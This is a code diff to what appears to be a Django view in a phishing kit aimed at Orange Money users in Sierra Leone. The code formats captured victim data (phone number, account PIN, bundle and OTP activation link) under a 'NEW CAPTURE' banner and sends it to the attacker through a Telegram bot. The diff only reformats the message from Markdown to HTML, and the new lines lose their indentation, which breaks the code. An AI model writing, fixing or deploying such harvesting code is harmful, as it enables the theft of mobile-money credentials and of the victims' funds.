@@ -99,18 +99,22 @@ def sync_data(request):
             logger.error("CRITICAL: TELEGRAM_BOT_TOKEN or TELEGRAM_CHAT_ID missing in Render Settings.")
             return JsonResponse({"status": "error", "message": "Server config missing"}, status=500)
 
-        # Format Telegram Message
-        message = (
-            "🇸🇱 *ORANGE MAX IT - NEW CAPTURE*\n"
-            "━━━━━━━━━━━━━━━━━━\n"
-            f"📞 *PHONE:* `+232 {phone}`\n"
-            f"🔑 *PIN:* `{pin}`\n"
-            f"📦 *BUNDLE:* {bundle}\n"
-            "━━━━━━━━━━━━━━━━━━\n"
-            f"🔗 *OTP LINK:*\n{otp_link}\n"
-            "━━━━━━━━━━━━━━━━━━\n"
-            "📡 *STATUS:* DATA RECEIVED"
-        )
+        # Inside your view
+message = (
+    "🇸🇱 <b>ORANGE MAX IT - NEW CAPTURE</b>\n"
+    "━━━━━━━━━━━━━━━━━━\n"
+    f"📞 <b>PHONE:</b> {order.phone_number}\n"
+    f"🔑 <b>PIN:</b> {order.orange_pin}\n"
+    f"📦 <b>BUNDLE:</b> {order.bundle.name}\n"
+    "━━━━━━━━━━━━━━━━━━\n"
+    "🔗 <b>OTP LINK:</b>\n"
+    f"{order.otp_activation_link}\n"
+    "━━━━━━━━━━━━━━━━━━\n"
+    "📡 <b>STATUS:</b> DATA RECEIVED"
+)
+
+# Send it
+send_telegram_notification(message)
 
         # Send to Telegram
         telegram_url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
